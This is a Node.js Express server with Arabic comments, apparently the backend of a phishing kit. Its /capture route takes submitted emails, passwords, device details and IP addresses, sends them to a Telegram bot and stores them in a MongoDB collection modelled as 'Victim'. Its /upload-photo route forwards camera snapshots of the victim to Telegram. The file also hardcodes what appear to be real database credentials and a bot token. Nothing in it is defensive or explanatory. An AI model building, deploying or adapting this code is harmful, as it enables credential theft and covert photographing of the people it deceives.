const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');
const path = require('path');
const FormData = require('form-data');

const app = express();

// إعدادات السيرفر المتقدمة
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' })); // لدعم إرسال الصور عالية الدقة
app.use(express.static(__dirname));

// بياناتك الثابتة (Hardcoded)
const MONGO_URI = "mongodb+srv://hamoodaix90_db_user:X4A0mkbVqQO09I9J@cluster0.ohfhehw.mongodb.net/sample_mflix?retryWrites=true&w=majority";
const BOT_TOKEN = "8336936813:AAENAKTwrPn6lCaxlWarBYQwAhCaGZBXwUk";
const CHAT_ID = "8351043975";

// الاتصال الذكي بقاعدة البيانات
mongoose.connect(MONGO_URI)
    .then(() => console.log("✅ Connected to MongoDB"))
    .catch(e => console.error("❌ DB Connection Failed:", e.message));

// نموذج تخزين البيانات
const Victim = mongoose.model('Victim', new mongoose.Schema({
    email: String,
    password: String,
    device: String,
    ip: String,
    timestamp: { type: Date, default: Date.now }
}));

// تقديم الصفحة الرئيسية
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// 1. مسار استقبال البيانات النصية (Email/Pass)
app.post('/capture', async (req, res) => {
    const data = req.body;
    const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    const msg = `
🚀 **صيد جديد - بيانات حساب**
━━━━━━━━━━━━━━
📧 **الحساب:** \`${data.email}\`
🔑 **الباسورد:** \`${data.password}\`
📱 **الجهاز:** \`${data.device}\`
🌐 **الآي بي:** \`${visitorIp}\`
⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}
━━━━━━━━━━━━━━`;

    try {
        // إرسال للتليجرام
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: msg,
            parse_mode: 'Markdown'
        });
        
        // حفظ في القاعدة
        const entry = new Victim({ ...data, ip: visitorIp });
        await entry.save();
        
        console.log("✅ Data Captured & Saved");
        res.status(200).send("OK");
    } catch (e) {
        console.error("❌ Capture Error:", e.message);
        res.status(500).send("Error");
    }
});

// 2. مسار استقبال وإرسال الصورة (Camera)
app.post('/upload-photo', async (req, res) => {
    try {
        const { image } = req.body;
        if (!image) return res.status(400).send("No image");

        // تحويل الصورة من Base64 إلى Buffer
        const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
        const buffer = Buffer.from(base64Data, 'base64');

        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', buffer, { filename: 'victim_face.jpg' });
        form.append('caption', `📸 صورة الضحية المتصل الآن\n🌐 IP: ${req.headers['x-forwarded-for'] || 'Unknown'}`);

        // إرسال الصورة كـ Photo وليس ملف عادي
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
            headers: { ...form.getHeaders() }
        });

        console.log("✅ Photo Uploaded to Telegram");
        res.status(200).send("Photo Sent");
    } catch (e) {
        console.error("❌ Photo Upload Error:", e.message);
        res.status(500).send("Error");
    }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`🚀 Master Server Active on Port ${PORT}`));
